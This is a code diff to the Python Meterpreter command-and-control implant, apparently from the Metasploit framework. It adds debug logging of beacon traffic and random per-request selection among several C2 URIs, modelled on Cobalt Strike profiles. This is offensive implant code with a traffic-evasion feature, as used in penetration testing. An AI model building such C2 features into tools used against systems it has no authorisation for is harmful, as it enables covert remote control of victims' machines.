@@ -459,6 +459,18 @@ def debug_print(msg):
     if DEBUGGING:
         logging.debug(msg)
 
+def debug_hexdump(label, data):
+    if DEBUGGING:
+        if data is None:
+            debug_print(label + ' = None')
+            return
+        preview = data[:64]
+        try:
+            hexed = binascii.b2a_hex(preview).decode('ascii')
+        except Exception:
+            hexed = repr(preview)
+        debug_print('%s (len=%d): %s%s' % (label, len(data), hexed, '...' if len(data) > 64 else ''))
+
 @export
 def debug_traceback(msg=None):
     if DEBUGGING:
@@ -926,7 +938,10 @@ class Transport(object):
     def _parse_c2_verb_options(group_bytes):
         """Parse GET or POST sub-group TLV bytes into an options dict."""
         opts = {}
-        opts['uri'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_URI).get('value')
+        # A profile's `set uri` may list several candidate URIs, emitted as
+        # repeated TLV_TYPE_C2_URI values. Collect them all; the request
+        # builder picks one at random per request (Cobalt Strike semantics).
+        opts['uris'] = [t['value'] for t in packet_enum_tlvs(group_bytes, TLV_TYPE_C2_URI)]
         opts['ua'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_UA).get('value')
         opts['headers'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_HEADERS).get('value')
         opts['enc_inbound'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_ENC_INBOUND).get('value', C2_ENCODING_NONE)
@@ -1162,7 +1177,9 @@ class HttpTransport(Transport):
         # self.url is intentionally discarded here.
         match = re.match(r'(https?://[^/]+)', self.url)
         base_url = match.group(1) if match else self.url
-        uri = c2_opts.get('uri') or ''
+        # Pick one of the profile's candidate URIs at random per request.
+        uris = c2_opts.get('uris') or []
+        uri = random.choice(uris) if uris else ''
         url = base_url + '/' + uri.lstrip('/')
 
         rendered = self._render_uuid(c2_opts, uuid) if uuid else ''
@@ -1214,9 +1231,11 @@ class HttpTransport(Transport):
             uuid = self._get_uuid()
             url = self._build_request_url(self.c2_get, uuid)
             headers = self._build_request_headers(self.c2_get, uuid)
+            debug_print('[GET] uuid=%r url=%s headers=%r' % (uuid, url, headers))
         else:
             url = self._non_c2_url()
             headers = self._http_request_headers
+            debug_print('[GET] (non-c2) url=%s' % url)
 
         request = urllib.Request(url, None, headers)
         urlopen_kwargs = {}
@@ -1226,25 +1245,33 @@ class HttpTransport(Transport):
             url_h = urllib.urlopen(request, **urlopen_kwargs)
             if url_h.code == 200:
                 raw_response = url_h.read()
+                debug_hexdump('[GET] raw response body', raw_response)
                 # Strip C2 profile prefix/suffix from response if configured
                 if self.c2_get:
                     prefix_skip = self.c2_get.get('prefix_skip', 0)
                     suffix_skip = self.c2_get.get('suffix_skip', 0)
                     end = len(raw_response) - suffix_skip if suffix_skip else len(raw_response)
                     raw_response = raw_response[prefix_skip:end]
+                    debug_print('[GET] after strip prefix_skip=%d suffix_skip=%d' % (prefix_skip, suffix_skip))
+                    debug_hexdump('[GET] stripped (pre-decode)', raw_response)
                     enc_in = self.c2_get.get('enc_inbound', C2_ENCODING_NONE)
                     if enc_in != C2_ENCODING_NONE:
                         raw_response = self._c2_decode(raw_response, enc_in)
+                        debug_hexdump('[GET] decoded (enc_inbound=%d)' % enc_in, raw_response)
 
                 packet = raw_response
                 if len(packet) < PACKET_HEADER_SIZE:
+                    debug_print('[GET] packet too short (%d < %d), discarding' % (len(packet), PACKET_HEADER_SIZE))
                     packet = None  # looks corrupt
                 else:
                     xor_key = struct.unpack('BBBB', packet[:PACKET_XOR_KEY_SIZE])
                     header = xor_bytes(xor_key, packet[:PACKET_HEADER_SIZE])
                     pkt_length = struct.unpack('>I', header[PACKET_LENGTH_OFF:PACKET_LENGTH_OFF + PACKET_LENGTH_SIZE])[0] - 8
                     if len(packet) != (pkt_length + PACKET_HEADER_SIZE):
+                        debug_print('[GET] length mismatch: hdr says %d, have %d, discarding' % (pkt_length + PACKET_HEADER_SIZE, len(packet)))
                         packet = None  # looks corrupt
+                    else:
+                        debug_print('[GET] valid packet, len=%d' % len(packet))
         except Exception as e:
             debug_traceback('[-] failure to receive packet from ' + url)
 
@@ -1696,10 +1723,15 @@ class PythonMeterpreter(object):
 
     def _core_patch_uuid(self, request, response):
         if not isinstance(self.transport, HttpTransport):
+            debug_print('[PATCH_UUID] transport is not HttpTransport (%r), ignoring' % type(self.transport).__name__)
             return ERROR_FAILURE, response
-        new_uuid = packet_get_tlv(request, TLV_TYPE_C2_UUID)['value']
-        if not self.transport.patch_uuid(new_uuid):
+        uuid_tlv = packet_get_tlv(request, TLV_TYPE_C2_UUID)
+        new_uuid = uuid_tlv.get('value')
+        debug_print('[PATCH_UUID] old c2_uuid=%r -> new=%r' % (self.transport.c2_uuid, new_uuid))
+        if not new_uuid or not self.transport.patch_uuid(new_uuid):
+            debug_print('[PATCH_UUID] patch failed (new_uuid=%r)' % new_uuid)
             return ERROR_FAILURE, response
+        debug_print('[PATCH_UUID] patched; c2_uuid now=%r' % self.transport.c2_uuid)
         return ERROR_SUCCESS, response
 
     def _core_negotiate_tlv_encryption(self, request, response):
@@ -1904,6 +1936,8 @@ class PythonMeterpreter(object):
     def create_response(self, request):
         response = struct.pack('>I', PACKET_TYPE_RESPONSE)
         commd_id_tlv = packet_get_tlv(request, TLV_TYPE_COMMAND_ID)
+        debug_hexdump('[REQ] incoming packet (post-decrypt TLVs)', request)
+        debug_print('[REQ] command id=%r name=%r' % (commd_id_tlv.get('value'), cmd_id_to_string(commd_id_tlv.get('value')) if commd_id_tlv else None))
         response += tlv_pack(commd_id_tlv)
         response += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(bytes(PAYLOAD_UUID, 'UTF-8')))
 
